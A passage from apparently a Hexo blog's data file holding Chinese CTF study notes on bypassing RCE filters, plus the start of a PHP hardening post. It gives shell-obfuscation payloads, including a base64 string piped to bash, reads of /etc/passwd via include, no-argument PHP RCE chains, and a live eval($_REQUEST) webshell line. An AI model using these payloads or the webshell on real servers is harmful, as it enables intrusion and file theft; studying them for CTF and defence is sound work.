利用shell特殊变量绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9)，<code>${x}</code>(x&gt;=10)。</p>\n<p>PS：因为在没有传参的情况下，上面的特殊变量都是为空的</p>\n<p>比如<code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p>\n<h3 id=\"–-linux中直接查看文件内容的工具\"><a href=\"#–-linux中直接查看文件内容的工具\" class=\"headerlink\" title=\"– linux中直接查看文件内容的工具\"></a>– linux中直接查看文件内容的工具</h3><pre><code> cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awk\nmore:一页一页的显示档案内容\nless:与 more 类似\nhead:查看头几行\ntac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\ntail:查看尾几行\nnl：显示的时候，顺便输出行号\nod:以二进制的方式读取档案内容\nvi:一种编辑器，这个也可以查看\nvim:一种编辑器，这个也可以查看\nsort:可以查看\nuniq:可以查看\nfile -f:报错出具体内容</code></pre><p>假设该目录下有index.php和flag.php</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">cat `ls`<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>等同于</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">cat flag.php;cat index.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>cat新姿势/bin/?at</p>\n<h3 id=\"–-文件构造\"><a href=\"#–-文件构造\" class=\"headerlink\" title=\"– 文件构造\"></a>– 文件构造</h3><p>在ctfhub文件包含中，有一个shell,txt,也就是文件<br>我们令?file = shell.txt，已知shell.txt内容为</p>\n<!--?php eval($_REQUEST['ctfhub']);?-->\n\n<p>request类型是由get和post构成的<br>在post数据里输入<br>ctfhub=system(“ls /“);<br>就可以执行命令.</p>\n<h2 id=\"–-无需括号的函数\"><a href=\"#–-无需括号的函数\" class=\"headerlink\" title=\"– 无需括号的函数\"></a>– 无需括号的函数</h2><pre class=\"line-numbers language-php\"><code class=\"language-php\">```php\n<span class=\"token delimiter\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token number\">666</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">print</span> <span class=\"token number\">666</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">die</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span> <span class=\"token string\">\"/etc/passwd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require</span> <span class=\"token string\">\"/etc/passwd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string\">\"/etc/passwd\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">require_once</span> <span class=\"token string\">\"/etc/passwd\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"–-过滤单引号和双引号\"><a href=\"#–-过滤单引号和双引号\" class=\"headerlink\" title=\"– 过滤单引号和双引号\"></a>– 过滤单引号和双引号</h2><p>$_GET[1]</p>\n<p>$_POST[a]</p>\n<p>此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。</p>\n<h2 id=\"–-无参数文件读取\"><a href=\"#–-无参数文件读取\" class=\"headerlink\" title=\"– 无参数文件读取\"></a>– 无参数文件读取</h2><blockquote>\n<p>参考</p>\n<p><a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\" target=\"_blank\" rel=\"noopener\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>\n</blockquote>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><ol>\n<li>利用超全局变量进行bypass,进行RCE</li>\n<li>进行任意文件读取</li>\n</ol>\n<h3 id=\"法一：localeconv\"><a href=\"#法一：localeconv\" class=\"headerlink\" title=\"法一：localeconv()\"></a>法一：localeconv()</h3><ul>\n<li><p>highlight_file()</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png\" alt=\"image-20210518200944707\"></p>\n</li>\n<li><p>此函数用来获取<code>.</code>，在windows及linux中均表示当前目录</p>\n<p>localeconv()函数返回包含本地数字及货币格式信息的数组</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png\" alt=\"image-20210518174614995\"></p>\n</li>\n<li><p>scandir()函数用来列出指定路径中的文件和目录</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png\" alt=\"image-20210518165817130\"></p>\n</li>\n<li><p>current()函数返回数组中的当前元素(单元)，默认取第一个值</p>\n</li>\n<li><p>pos()同current()，是current()的别名</p>\n</li>\n<li><p>reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE</p>\n<p>构造如下：</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">pos</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">reset</span><span class=\"token punctuation\">(</span><span class=\"token function\">localeconv</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n</li>\n</ul>\n<h3 id=\"法二（待完善）-getenv\"><a href=\"#法二（待完善）-getenv\" class=\"headerlink\" title=\"法二（待完善）:getenv()\"></a>法二（待完善）:getenv()</h3><p><strong>注意</strong>：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png\" alt=\"image-20210518190014039\"><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png\" alt=\"image-20210518185825681\"></p>\n<p>php常见超全局变量</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$GLOBALS</span>\n<span class=\"token variable\">$_SERVER</span>\n<span class=\"token variable\">$_GET</span>\n<span class=\"token variable\">$_POST</span>\n<span class=\"token variable\">$_FILES</span>\n<span class=\"token variable\">$_COOKIE</span>\n<span class=\"token variable\">$_SESSION</span>\n<span class=\"token variable\">$_REQUEST</span>\n<span class=\"token variable\">$_ENV</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png\" alt=\"image-20210518162644882\"></p>\n<p>但如何从数组中取出指定值，这里可以使用方法：<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png\" alt=\"image-20210518162756460\"></p>\n<p>结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。</p>\n<h3 id=\"法三：getallheaders\"><a href=\"#法三：getallheaders\" class=\"headerlink\" title=\"法三：getallheaders()\"></a>法三：getallheaders()</h3><p><strong>限制</strong>：getallheaders()为apache函数，目标中间件必须为apache。</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png\" alt=\"image-20210518192151719\"></p>\n<p>返回值</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Cookie\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">36</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Accept-Language\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"en-US,en;q=0.9\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Accept-Encoding\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">17</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"gzip, deflate, br\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Sec-Fetch-Dest\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"document\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Sec-Fetch-Mode\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"navigate\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Sec-Fetch-Site\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"cross-site\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Accept\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"User-Agent\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">115</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Upgrade-Insecure-Requests\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"1\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Sec-Ch-Ua-Mobile\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"?0\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Sec-Ch-Ua\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"\"</span> Not A<span class=\"token punctuation\">;</span>Brand<span class=\"token string\">\";v=\"</span><span class=\"token number\">99</span><span class=\"token string\">\", \"</span>Chromium<span class=\"token string\">\";v=\"</span><span class=\"token number\">90</span><span class=\"token string\">\", \"</span>Google Chrome<span class=\"token string\">\";v=\"</span><span class=\"token number\">90</span><span class=\"token string\">\"\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Connection\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"close\"</span> \n    <span class=\"token punctuation\">[</span><span class=\"token string\">\"Host\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token function\">string</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token string\">\"127.0.0.1\"</span> \n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>通过修改request包，进行简单爆破就能获取指定位置的恶意参数</p>\n<p><img src=\"C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png\" alt=\"image-20210518200344715\"></p>\n<h3 id=\"法四：get-defined-vars\"><a href=\"#法四：get-defined-vars\" class=\"headerlink\" title=\"法四：get_defined_vars()\"></a>法四：get_defined_vars()</h3><p>利用get_defined_vars()使用范围更广一些。</p>\n<p>查看回显</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png\" alt=\"image-20210518203122147\"></p>\n<p>发现其可以回显全局变量</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\"><span class=\"token variable\">$_GET</span>\n<span class=\"token variable\">$_POST</span>\n<span class=\"token variable\">$_FILES</span>\n<span class=\"token variable\">$_COOKIE</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的选择也就具有多样性，可以利用<code>$_GET</code>进行RCE，如下<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png\" alt=\"image-20210518203341256\"></p>\n<p>将其参数取出</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png\" alt=\"image-20210518203719246\"></p>\n<p>可以成功RCE</p>\n<h1 id=\"异或-取反-自增-按位或-按位与\"><a href=\"#异或-取反-自增-按位或-按位与\" class=\"headerlink\" title=\"异或 取反 自增 按位或 按位与\"></a>异或 取反 自增 按位或 按位与</h1><p>先记录这么个思路，待实践。</p>\n","site":{"data":{"friends":[{"name":"知乎专栏","url":"https://zhuanlan.zhihu.com/godweiyang","title":"访问主页","introduction":"算法码上来","avatar":"/medias/avatars/myzhihu.png"}],"musics":[{"name":"夜曲","artist":"周杰伦","url":"/medias/music/yequ.mp3","cover":"/medias/music/avatars/yequ.jpg"},{"name":"一路向北","artist":"周杰伦","url":"/medias/music/yiluxiangbei.mp3","cover":"/medias/music/avatars/yiluxiangbei.jpg"},{"name":"来自天堂的魔鬼","artist":"邓紫棋","url":"/medias/music/tiantangdemogui.mp3","cover":"/medias/music/avatars/tiantangdemogui.jpg"},{"name":"倒数","artist":"邓紫棋","url":"/medias/music/daoshu.mp3","cover":"/medias/music/avatars/daoshu.jpg"}]}},"excerpt":"","more":"<h1 id=\"RCE-Bypass\"><a href=\"#RCE-Bypass\" class=\"headerlink\" title=\"RCE Bypass\"></a>RCE Bypass</h1><p>参考<a href=\"https://blog.csdn.net/loseheart157/article/details/109305380\" target=\"_blank\" rel=\"noopener\">RCE漏洞之绕过</a></p>\n<h2 id=\"花括号\"><a href=\"#花括号\" class=\"headerlink\" title=\"- 花括号\"></a>- 花括号</h2><p><code>{}</code></p>\n<p>在linux bash中还可以使用{OS_COMMAND,ARGUMENT}来执行系统命令</p>\n<p><code>{cat,flag}</code></p>\n<h2 id=\"反斜杠\"><a href=\"#反斜杠\" class=\"headerlink\" title=\"- 反斜杠\"></a>- 反斜杠</h2><p>路径<code>/</code></p>\n<p>反斜杠<code>\\</code>是在正则等语法里面，表示后面跟的字符是正常字符，不需要转义。</p>\n<p>也就意味着，我们可以在rce漏洞，过滤掉<code>cat</code>、<code>ls</code>等命令时，使用<code>ca\\t</code>来实现绕过</p>\n<h2 id=\"空格过滤\"><a href=\"#空格过滤\" class=\"headerlink\" title=\"- 空格过滤\"></a>- 空格过滤</h2><p><strong>注意:</strong>在使用带有<code>$</code>的内容替换时，要注意用<code>\\</code>转义，因为<code>$</code>在php中有特殊含义</p>\n<pre><code>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</code></pre><h2 id=\"一些命令分隔符\"><a href=\"#一些命令分隔符\" class=\"headerlink\" title=\"- 一些命令分隔符\"></a>- 一些命令分隔符</h2><p>linux中：<code>%0a</code>（回车）、<code>%0d</code>（换行）、<code>;</code>、<code>&amp;</code>、<code>|</code>、<code>&amp;&amp;</code>、<code>||</code></p>\n<p>windows中：<code>%0a</code>、<code>&amp;</code>、<code>|</code>、<code>%1a</code>（一个神奇的角色，作为<strong>.bat</strong>文件中的命令分隔符）</p>\n<h2 id=\"黑名单绕过\"><a href=\"#黑名单绕过\" class=\"headerlink\" title=\"- 黑名单绕过\"></a>- 黑名单绕过</h2><h3 id=\"–-变量拼接绕过\"><a href=\"#–-变量拼接绕过\" class=\"headerlink\" title=\"– 变量拼接绕过\"></a>– 变量拼接绕过</h3><p>例如：</p>\n<pre><code class=\"shell\">a=l;b=s;$a$b</code></pre>\n<p>利用偶读拼接方法绕过黑名单：</p>\n<pre><code class=\"shell\">a=fl;b=ag;cat $a$b</code></pre>\n<p>利用.拼接绕过<code>(sy.(st).em)</code></p>\n<p>使用内敛执行代替system</p>\n<pre><code class=\"php\">echo `ls`;\necho $(ls);\n?&gt;&lt;?=`ls`;\n?&gt;&lt;?=$(ls);\n&lt;?=`ls /`;?&gt;   #等效于&lt;?php echo `ls /`;?&gt;</code></pre>\n<h3 id=\"–-编码绕过\"><a href=\"#–-编码绕过\" class=\"headerlink\" title=\"– 编码绕过\"></a>– 编码绕过</h3><pre><code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash\n-d是解码，是base64解码\n\nxxd - r -p可以转换16进制，同样用户管道符之后。</code></pre><h3 id=\"–-单引号和双引号绕过\"><a href=\"#–-单引号和双引号绕过\" class=\"headerlink\" title=\"– 单引号和双引号绕过\"></a>– 单引号和双引号绕过</h3><pre><code class=\"shell\">比如ca&#39;&#39;t flag或cat&quot;&quot;t flag</code></pre>\n<h3 id=\"–-利用shell特殊变量绕过\"><a href=\"#–-利用shell特殊变量绕过\" class=\"headerlink\" title=\"– 利用shell特殊变量绕过\"></a>– 利用shell特殊变量绕过</h3><p>使用<code>$*</code>和<code>$@</code>，<code>$x</code>(x代表1-9)，<code>${x}</code>(x&gt;=10)。</p>\n<p>PS：因为在没有传参的情况下，上面的特殊变量都是为空的</p>\n<p>比如<code>ca$@t fla$@g</code>或者<code>ca$1t fla$2g</code></p>\n<h3 id=\"–-linux中直接查看文件内容的工具\"><a href=\"#–-linux中直接查看文件内容的工具\" class=\"headerlink\" title=\"– linux中直接查看文件内容的工具\"></a>– linux中直接查看文件内容的工具</h3><pre><code> cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、cut、awk\nmore:一页一页的显示档案内容\nless:与 more 类似\nhead:查看头几行\ntac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示\ntail:查看尾几行\nnl：显示的时候，顺便输出行号\nod:以二进制的方式读取档案内容\nvi:一种编辑器，这个也可以查看\nvim:一种编辑器，这个也可以查看\nsort:可以查看\nuniq:可以查看\nfile -f:报错出具体内容</code></pre><p>假设该目录下有index.php和flag.php</p>\n<pre><code class=\"shell\">cat `ls`</code></pre>\n<p>等同于</p>\n<pre><code class=\"shell\">cat flag.php;cat index.php</code></pre>\n<p>cat新姿势/bin/?at</p>\n<h3 id=\"–-文件构造\"><a href=\"#–-文件构造\" class=\"headerlink\" title=\"– 文件构造\"></a>– 文件构造</h3><p>在ctfhub文件包含中，有一个shell,txt,也就是文件<br>我们令?file = shell.txt，已知shell.txt内容为</p>\n<?php eval($_REQUEST['ctfhub']);?>\n\n<p>request类型是由get和post构成的<br>在post数据里输入<br>ctfhub=system(“ls /“);<br>就可以执行命令.</p>\n<h2 id=\"–-无需括号的函数\"><a href=\"#–-无需括号的函数\" class=\"headerlink\" title=\"– 无需括号的函数\"></a>– 无需括号的函数</h2><pre><code class=\"php\">```php\n&lt;?php\necho 666;\nprint 666;\ndie;\ninclude &quot;/etc/passwd&quot;;\nrequire &quot;/etc/passwd&quot;;\ninclude_once &quot;/etc/passwd&quot;;\nrequire_once &quot;/etc/passwd&quot;;</code></pre>\n<h2 id=\"–-过滤单引号和双引号\"><a href=\"#–-过滤单引号和双引号\" class=\"headerlink\" title=\"– 过滤单引号和双引号\"></a>– 过滤单引号和双引号</h2><p>$_GET[1]</p>\n<p>$_POST[a]</p>\n<p>此处为何参数不需要单引号或双引号也能用，不太清楚，但的确能用。</p>\n<h2 id=\"–-无参数文件读取\"><a href=\"#–-无参数文件读取\" class=\"headerlink\" title=\"– 无参数文件读取\"></a>– 无参数文件读取</h2><blockquote>\n<p>参考</p>\n<p><a href=\"https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/\" target=\"_blank\" rel=\"noopener\">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p>\n</blockquote>\n<h3 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h3><ol>\n<li>利用超全局变量进行bypass,进行RCE</li>\n<li>进行任意文件读取</li>\n</ol>\n<h3 id=\"法一：localeconv\"><a href=\"#法一：localeconv\" class=\"headerlink\" title=\"法一：localeconv()\"></a>法一：localeconv()</h3><ul>\n<li><p>highlight_file()</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518200944707.png\" alt=\"image-20210518200944707\"></p>\n</li>\n<li><p>此函数用来获取<code>.</code>，在windows及linux中均表示当前目录</p>\n<p>localeconv()函数返回包含本地数字及货币格式信息的数组</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518174614995.png\" alt=\"image-20210518174614995\"></p>\n</li>\n<li><p>scandir()函数用来列出指定路径中的文件和目录</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518165817130.png\" alt=\"image-20210518165817130\"></p>\n</li>\n<li><p>current()函数返回数组中的当前元素(单元)，默认取第一个值</p>\n</li>\n<li><p>pos()同current()，是current()的别名</p>\n</li>\n<li><p>reset()函数返回数组第一个单元的值，如果数组为空则返回FALSE</p>\n<p>构造如下：</p>\n<pre><code class=\"php\">print_r(scandir(current(localeconv())));\nprint_r(scandir(pos(localeconv())));\nprint_r(scandir(reset(localeconv())));</code></pre>\n</li>\n</ul>\n<h3 id=\"法二（待完善）-getenv\"><a href=\"#法二（待完善）-getenv\" class=\"headerlink\" title=\"法二（待完善）:getenv()\"></a>法二（待完善）:getenv()</h3><p><strong>注意</strong>：貌似只有php7.1.0才行，在docker中试了一下php5.6，提示getenv()需要提供参数<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518190014039.png\" alt=\"image-20210518190014039\"><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518185825681.png\" alt=\"image-20210518185825681\"></p>\n<p>php常见超全局变量</p>\n<pre><code class=\"php\">$GLOBALS\n$_SERVER\n$_GET\n$_POST\n$_FILES\n$_COOKIE\n$_SESSION\n$_REQUEST\n$_ENV</code></pre>\n<p>这里可以使用<code>$_ENV</code>，对应函数为<code>getenv()</code></p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162644882.png\" alt=\"image-20210518162644882\"></p>\n<p>但如何从数组中取出指定值，这里可以使用方法：<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518162756460.png\" alt=\"image-20210518162756460\"></p>\n<p>结合array_rand()、array_flip()及getenv()，我们可以用爆破的方式获取数组中任意位置需要的值，可获取指定位置的恶意参数。</p>\n<h3 id=\"法三：getallheaders\"><a href=\"#法三：getallheaders\" class=\"headerlink\" title=\"法三：getallheaders()\"></a>法三：getallheaders()</h3><p><strong>限制</strong>：getallheaders()为apache函数，目标中间件必须为apache。</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518192151719.png\" alt=\"image-20210518192151719\"></p>\n<p>返回值</p>\n<pre><code class=\"php\">array(13) { \n    [&quot;Cookie&quot;]=&gt; string(36) &quot;PHPSESSID=58o6f1g08ot3drhnbs0m22i1hv&quot; \n    [&quot;Accept-Language&quot;]=&gt; string(14) &quot;en-US,en;q=0.9&quot; \n    [&quot;Accept-Encoding&quot;]=&gt; string(17) &quot;gzip, deflate, br&quot; \n    [&quot;Sec-Fetch-Dest&quot;]=&gt; string(8) &quot;document&quot; \n    [&quot;Sec-Fetch-Mode&quot;]=&gt; string(8) &quot;navigate&quot; \n    [&quot;Sec-Fetch-Site&quot;]=&gt; string(10) &quot;cross-site&quot; \n    [&quot;Accept&quot;]=&gt; string(135) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot; \n    [&quot;User-Agent&quot;]=&gt; string(115) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot; \n    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; \n    [&quot;Sec-Ch-Ua-Mobile&quot;]=&gt; string(2) &quot;?0&quot; \n    [&quot;Sec-Ch-Ua&quot;]=&gt; string(64) &quot;&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;90&quot;, &quot;Google Chrome&quot;;v=&quot;90&quot;&quot; \n    [&quot;Connection&quot;]=&gt; string(5) &quot;close&quot; \n    [&quot;Host&quot;]=&gt; string(9) &quot;127.0.0.1&quot; \n}</code></pre>\n<p>通过修改request包，进行简单爆破就能获取指定位置的恶意参数</p>\n<p><img src=\"C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20210518200344715.png\" alt=\"image-20210518200344715\"></p>\n<h3 id=\"法四：get-defined-vars\"><a href=\"#法四：get-defined-vars\" class=\"headerlink\" title=\"法四：get_defined_vars()\"></a>法四：get_defined_vars()</h3><p>利用get_defined_vars()使用范围更广一些。</p>\n<p>查看回显</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203122147.png\" alt=\"image-20210518203122147\"></p>\n<p>发现其可以回显全局变量</p>\n<pre><code class=\"php\">$_GET\n$_POST\n$_FILES\n$_COOKIE</code></pre>\n<p>这里的选择也就具有多样性，可以利用<code>$_GET</code>进行RCE，如下<img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203341256.png\" alt=\"image-20210518203341256\"></p>\n<p>将其参数取出</p>\n<p><img src=\"https://gitee.com/h1ler/blogimage/raw/master/img/image-20210518203719246.png\" alt=\"image-20210518203719246\"></p>\n<p>可以成功RCE</p>\n<h1 id=\"异或-取反-自增-按位或-按位与\"><a href=\"#异或-取反-自增-按位或-按位与\" class=\"headerlink\" title=\"异或 取反 自增 按位或 按位与\"></a>异或 取反 自增 按位或 按位与</h1><p>先记录这么个思路，待实践。</p>\n"},{"title":"RCE防护","date":"2021-09-10T06:01:10.989Z","top":false,"cover":false,"password":null,"toc":true,"mathjax":true,"summary":null,"_content":"\n\n\n代码注入的防治：\n\n1. 升级到PHP7.1，该版本对大部分常见的执行动态代码的函数进行了封堵。\n2. php.ini中，关闭`allow_url_fopen`。在打开它的情况下，可以通过`phar://`等协议丢给`include`，让其执行动态代码。\n3. php.ini中，通过`disable_functions`关闭`exec`,`passthru`,`shell_exec`,`system`等函数，禁止PHP调用外部程序。\n4. 永远不要在代码中使用`eval`。\n5. 设置好上传文件夹的权限，禁止从该文件夹执行代码。\n6. include文件的时候，注意文件的来源；需要动态include时做好参数过滤。\n7. 对于`preg_replace()`函数，要放弃使用/e修饰符，也可以使用`preg_replace_callback()`函数代替。如果一定要使用该函数，请保证第二个参数中，对于正则匹配出的对象用单引号包裹，因为`mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit]) /e`修正符使preg_replace()将replacement参数当作PHP代码（在适当的逆向引用替换完之后）。\n\n","source":"_posts/RCE防护.md","raw":"---\ntitle: RCE防护\ndate: {{ date }}\ntop: false\ncover: false\npassword:\ntoc: true\nmathjax: true\nsummary:\ntags: RCE\ncategories: RCE\n---\n\n\n\n代码注入的防治：\n\n1. 升级到PHP7.1，该版本对大部分常见的执行动态代码的函数进行了封堵。\n2. 